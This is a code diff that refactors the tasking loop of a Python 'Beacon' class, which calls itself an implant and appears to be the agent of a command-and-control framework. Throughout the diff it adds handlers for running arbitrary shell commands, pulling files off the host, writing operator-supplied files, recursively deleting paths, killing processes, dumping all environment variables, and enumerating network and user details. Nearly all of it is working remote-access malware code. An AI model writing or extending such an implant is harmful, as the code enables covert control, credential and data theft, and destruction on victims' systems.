@@ -4,9 +4,10 @@ import random
 import socket
 import os
 import platform
+import shutil
 import subprocess
 from pathlib import Path
-from typing import Dict, List
+from typing import Callable, Dict, List, Tuple
 
 
 CHARACTER_POOL = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
@@ -111,6 +112,8 @@ class Beacon:
         self.tasks: List[Dict[str, object]] = []
         self.taskResults: List[Dict[str, object]] = []
 
+        self._instruction_handlers: Dict[str, Callable[[str, str, bytes, str, str, int], Tuple[str, bytes]]] = {}
+
         self.beaconHash = ''.join(random.choice(CHARACTER_POOL) for _ in range(32))
 
         self.hostname = socket.gethostname()
@@ -136,9 +139,44 @@ class Beacon:
         self.additionalInfo = ""
         self.xorKey = ""
 
+        self._register_instruction_handlers()
+
 
     def set_xor_key(self, key: str) -> None:
         self.xorKey = key or ""
+
+    def _register_instruction_handlers(self) -> None:
+        handlers = {
+            "modulecmd": self._handle_module_cmd,
+            "change_directory": self._handle_change_directory,
+            "changedirectory": self._handle_change_directory,
+            "cd": self._handle_change_directory,
+            "download": self._handle_download,
+            "upload": self._handle_upload,
+            "listdirectory": self._handle_list_directory,
+            "ls": self._handle_list_directory,
+            "dir": self._handle_list_directory,
+            "listprocesses": self._handle_list_processes,
+            "ps": self._handle_list_processes,
+            "powershell": self._handle_powershell,
+            "printworkingdirectory": self._handle_pwd,
+            "pwd": self._handle_pwd,
+            "run": self._handle_run,
+            "shell": self._handle_shell,
+            "cat": self._handle_cat,
+            "mkdir": self._handle_mkdir,
+            "remove": self._handle_remove,
+            "rm": self._handle_remove,
+            "killprocess": self._handle_kill_process,
+            "tree": self._handle_tree,
+            "getenv": self._handle_getenv,
+            "whoami": self._handle_whoami,
+            "netstat": self._handle_netstat,
+            "ipconfig": self._handle_ipconfig,
+            "enumerateshares": self._handle_enumerate_shares,
+        }
+
+        self._instruction_handlers = handlers
 
     def _collect_internal_ips(self) -> str:
         ips: List[str] = []
@@ -346,101 +384,16 @@ class Beacon:
                 data = data.encode("utf-8")
 
             result = ""
-            if instruction == INSTRUCTION_LS:
-                if cmd == "":
-                    cmd = DEFAULT_LIST_DIRECTORY
+
+            handler = self._instruction_handlers.get(str(instruction).lower())
+
+            if handler:
                 try:
-                    dic = os.listdir(cmd)
-                    for entry in dic:
-                        target_path = os.path.join(cmd, entry)
-                        if os.path.isfile(target_path):
-                            file_type = FILE_TYPE_FILE
-                        elif os.path.isdir(target_path):
-                            file_type = FILE_TYPE_DIRECTORY
-                        else:
-                            file_type = FILE_TYPE_FILE
-
-                        mask = oct(os.stat(target_path).st_mode)[PERMISSION_SLICE_START:]
-                        path = Path(target_path)
-                        try:
-                            owner = path.owner()
-                        except Exception:
-                            owner = UNKNOWN_OWNER
-                        try:
-                            group = path.group()
-                        except Exception:
-                            group = UNKNOWN_GROUP
-                        result += (
-                            file_type
-                            + mask
-                            + " "
-                            + owner
-                            + " "
-                            + group
-                            + " "
-                            + target_path
-                        )
-                        result += "\n"
-                except:
-                    result = ERROR_NO_SUCH_FILE_PREFIX + cmd
-
-            elif instruction == INSTRUCTION_PS:
-                ps_command = (
-                    PS_COMMAND_WINDOWS
-                    if self.os.lower().startswith(WINDOWS_PLATFORM_PREFIX)
-                    else PS_COMMAND_LINUX
-                )
-                result = subprocess.run(
-                    ps_command,
-                    shell=True,
-                    stderr=subprocess.STDOUT,
-                    stdout=subprocess.PIPE,
-                ).stdout.decode("utf-8")
-
-            elif instruction == INSTRUCTION_CD:
-                os.chdir(cmd)
-                result = os.getcwd()
-
-            elif instruction == INSTRUCTION_PWD:
-                result = os.getcwd()
-
-            elif instruction == INSTRUCTION_CAT:
-                if os.path.isfile(inputFile):
-                    f = open(inputFile, "rb")
-                    data = f.read()
-                    f.close()
-                    result = data.decode('utf-8')
-
-            elif instruction == INSTRUCTION_DOWNLOAD:
-                if os.path.isfile(inputFile):
-                    try:
-                        f = open(inputFile, "rb")
-                        data = f.read()
-                        f.close()
-                        result = DEFAULT_DOWNLOAD_SUCCESS
-                    except:
-                        result = DEFAULT_DOWNLOAD_FAILURE
-                else:
-                    result = DEFAULT_DOWNLOAD_FAILURE
-
-            elif instruction == INSTRUCTION_UPLOAD:
-                try:
-                    f = open(outputFile, "wb")
-                    f.write(data)
-                    f.close()
-                    result = DEFAULT_UPLOAD_SUCCESS
-                except:
-                    result = DEFAULT_UPLOAD_FAILURE
-
-            elif instruction == INSTRUCTION_RUN:
-                result = subprocess.run(
-                    cmd,
-                    shell=True,
-                    stderr=subprocess.STDOUT,
-                    stdout=subprocess.PIPE,
-                ).stdout.decode('utf-8')
-                if not result:
-                    result = DEFAULT_EMPTY_RESPONSE
+                    handler_result, data = handler(cmd, args, data, inputFile, outputFile, pid)
+                    result = handler_result
+                except Exception:
+                    result = DEFAULT_UNKNOWN_COMMAND
+                    data = b""
 
             elif instruction == INSTRUCTION_SLEEP:
                 self.sleepTimeMs=int(cmd)*SLEEP_SECONDS_TO_MILLISECONDS
@@ -451,6 +404,9 @@ class Beacon:
 
             else:
                 result = DEFAULT_UNKNOWN_COMMAND
+
+            if not isinstance(result, str):
+                result = str(result)
 
             taskResult = {
                 "args":args,
@@ -468,3 +424,228 @@ class Beacon:
 
         # cleaning
         self.tasks.clear()
+
+    def _handle_module_cmd(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        return ("Module commands are not required for this implant.", b"")
+
+    def _handle_change_directory(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        target = cmd or args or input_file or "."
+        try:
+            os.chdir(target)
+            return (os.getcwd(), b"")
+        except Exception as exc:
+            return (f"Failed to change directory: {exc}", b"")
+
+    def _handle_download(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        path = input_file or cmd or args
+        if not path:
+            return (DEFAULT_DOWNLOAD_FAILURE, b"")
+        try:
+            with open(path, "rb") as fh:
+                file_data = fh.read()
+            return (DEFAULT_DOWNLOAD_SUCCESS, file_data)
+        except Exception:
+            return (DEFAULT_DOWNLOAD_FAILURE, b"")
+
+    def _handle_upload(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        path = output_file or cmd or args
+        if not path:
+            return (DEFAULT_UPLOAD_FAILURE, data)
+        try:
+            with open(path, "wb") as fh:
+                fh.write(data)
+            return (DEFAULT_UPLOAD_SUCCESS, b"")
+        except Exception:
+            return (DEFAULT_UPLOAD_FAILURE, data)
+
+    def _handle_list_directory(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        directory = cmd or args or input_file or "."
+        try:
+            entries = os.listdir(directory)
+        except Exception:
+            return (ERROR_NO_SUCH_FILE_PREFIX + directory, b"")
+
+        lines: List[str] = []
+        for entry in sorted(entries):
+            full_path = os.path.join(directory, entry)
+            try:
+                mode = oct(os.stat(full_path).st_mode)[-3:]
+                path_obj = Path(full_path)
+                owner = path_obj.owner()
+                group = path_obj.group()
+            except Exception:
+                mode = "---"
+                owner = "unknown"
+                group = "unknown"
+            entry_type = "d" if os.path.isdir(full_path) else "f"
+            lines.append(f"{entry_type}{mode} {owner} {group} {full_path}")
+
+        return ("\n".join(lines), b"")
+
+    def _handle_list_processes(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        try:
+            completed = subprocess.run(
+                [PS_COMMAND],
+                shell=True,
+                stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                timeout=30,
+            )
+            output = completed.stdout.decode("utf-8", errors="ignore")
+            return (output or DEFAULT_EMPTY_RESPONSE, b"")
+        except Exception as exc:
+            return (f"Failed to list processes: {exc}", b"")
+
+    def _handle_powershell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        return ("Powershell command execution is not supported on this platform.", b"")
+
+    def _handle_pwd(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        return (os.getcwd(), b"")
+
+    def _handle_run(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        command = cmd or args
+        if not command:
+            return (DEFAULT_EMPTY_RESPONSE, b"")
+        try:
+            completed = subprocess.run(
+                command,
+                shell=True,
+                stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                timeout=60,
+            )
+            output = completed.stdout.decode("utf-8", errors="ignore")
+            return (output or DEFAULT_EMPTY_RESPONSE, b"")
+        except Exception as exc:
+            return (f"Failed to execute command: {exc}", b"")
+
+    def _handle_shell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        return self._handle_run(cmd, args, data, input_file, output_file, pid)
+
+    def _handle_cat(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        path = input_file or cmd or args
+        if not path:
+            return (ERROR_NO_SUCH_FILE_PREFIX + path, b"") if path else ("No file specified.", b"")
+        try:
+            with open(path, "rb") as fh:
+                contents = fh.read()
+            return (contents.decode("utf-8", errors="ignore"), b"")
+        except Exception:
+            return (ERROR_NO_SUCH_FILE_PREFIX + path, b"")
+
+    def _handle_mkdir(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        directory = cmd or args or input_file
+        if not directory:
+            return ("No directory specified.", b"")
+        try:
+            os.makedirs(directory, exist_ok=True)
+            return (f"Directory created: {directory}", b"")
+        except Exception as exc:
+            return (f"Failed to create directory: {exc}", b"")
+
+    def _handle_remove(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        target = cmd or args or input_file
+        if not target:
+            return ("No path specified.", b"")
+        try:
+            if os.path.isdir(target) and not os.path.islink(target):
+                shutil.rmtree(target)
+            else:
+                os.remove(target)
+            return (f"Removed: {target}", b"")
+        except FileNotFoundError:
+            return (ERROR_NO_SUCH_FILE_PREFIX + target, b"")
+        except Exception as exc:
+            return (f"Failed to remove {target}: {exc}", b"")
+
+    def _handle_kill_process(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        pid_str = cmd or args or str(pid)
+        try:
+            process_id = int(pid_str)
+        except Exception:
+            return (f"Invalid PID: {pid_str}", b"")
+        try:
+            os.kill(process_id, 9)
+            return (f"Process {process_id} terminated.", b"")
+        except Exception as exc:
+            return (f"Failed to terminate process {process_id}: {exc}", b"")
+
+    def _handle_tree(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        base_path = cmd or args or input_file or "."
+        if not os.path.exists(base_path):
+            return (ERROR_NO_SUCH_FILE_PREFIX + base_path, b"")
+
+        lines: List[str] = []
+        base_path = os.path.abspath(base_path)
+        for root_dir, dirs, files in os.walk(base_path):
+            dirs.sort()
+            rel_path = os.path.relpath(root_dir, base_path)
+            level = 0 if rel_path == "." else rel_path.count(os.sep) + 1
+            indent = "    " * level
+            name = Path(root_dir).name if rel_path != "." else Path(base_path).name
+            lines.append(f"{indent}{name}/")
+            for fname in sorted(files):
+                lines.append(f"{indent}    {fname}")
+        return ("\n".join(lines), b"")
+
+    def _handle_getenv(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        key = cmd or args or input_file
+        if key:
+            return (os.environ.get(key, ""), b"")
+        env_dump = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
+        return (env_dump, b"")
+
+    def _handle_whoami(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        try:
+            completed = subprocess.run(
+                ["whoami"],
+                shell=False,
+                stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                timeout=10,
+            )
+            output = completed.stdout.decode("utf-8", errors="ignore").strip()
+            if output:
+                return (output, b"")
+        except Exception:
+            pass
+        return (self.username or DEFAULT_USERNAME, b"")
+
+    def _handle_netstat(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        commands = ["netstat -an", "ss -an"]
+        for command in commands:
+            try:
+                completed = subprocess.run(
+                    command,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    stdout=subprocess.PIPE,
+                    timeout=60,
+                )
+                output = completed.stdout.decode("utf-8", errors="ignore")
+                if output:
+                    return (output, b"")
+            except Exception:
+                continue
+        return (DEFAULT_EMPTY_RESPONSE, b"")
+
+    def _handle_ipconfig(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        commands = ["ip addr show", "ifconfig"]
+        for command in commands:
+            try:
+                completed = subprocess.run(
+                    command,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    stdout=subprocess.PIPE,
+                    timeout=60,
+                )
+                output = completed.stdout.decode("utf-8", errors="ignore")
+                if output:
+                    return (output, b"")
+            except Exception:
+                continue
+        return (DEFAULT_EMPTY_RESPONSE, b"")
+
+    def _handle_enumerate_shares(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
+        return ("Share enumeration is not supported on this implant.", b"")
